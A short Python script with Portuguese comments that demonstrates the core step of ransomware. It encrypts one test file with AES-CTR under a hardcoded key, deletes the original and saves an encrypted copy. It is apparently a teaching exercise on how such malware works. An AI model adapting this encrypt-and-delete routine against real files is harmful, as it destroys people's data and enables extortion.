import os
import pyaes

# Abre o arquivo original (teste.txt) em modo de leitura binária (rb) e lê todo o seu conteúdo.

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Define uma chave de criptografia (testeransonwares) e cria uma instância do AES no modo CTR (Counter) usando a biblioteca pyaes.

key = b'testeransonwares'
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografa os dados do arquivo usando a chave de criptografia.

encrypt_data = aes.encrypt(file_data)

# Remove o arquivo original (teste.txt) do sistema.

os.remove(file_name)

# Cria um novo arquivo criptografado (teste.txtcriptografado) em modo de escrita binária (wb) e grava os dados criptografados nele.

new_file = 'teste.txtcriptografado'
new_file = open(new_file, 'wb')
new_file.write(encrypt_data)
new_file.close()
